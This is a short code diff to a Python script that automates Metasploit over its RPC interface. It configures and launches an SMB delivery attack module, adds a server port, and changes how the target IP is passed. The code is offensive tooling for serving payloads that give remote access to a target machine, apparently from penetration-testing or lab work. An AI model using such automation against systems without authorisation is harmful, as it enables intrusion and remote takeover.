@@ -50,6 +50,7 @@ class Attack:
         self.__module = self.__rpc.modules.use(mtype, mname)
         self.__module.target = 0  # {0: 'DLL', 1: 'PSH'}
         self.__module["SRVHOST"] = self.__ipv4
+        self.__module['SRVPORT'] = 4445
         cid = self.__rpc.consoles.console().cid
         console = self.__rpc.consoles.console(cid)
         print(
@@ -62,6 +63,6 @@ class Attack:
 if __name__ == '__main__':
     client = MsfRpcClient("salt", port=55553, ssl=True)
 
-    atk = Attack(client, '10.0.2.4')
+    atk = Attack(client)
     atk.setModule(Modules.SMB_DELIVERY)
     atk.run_smb_delivery()
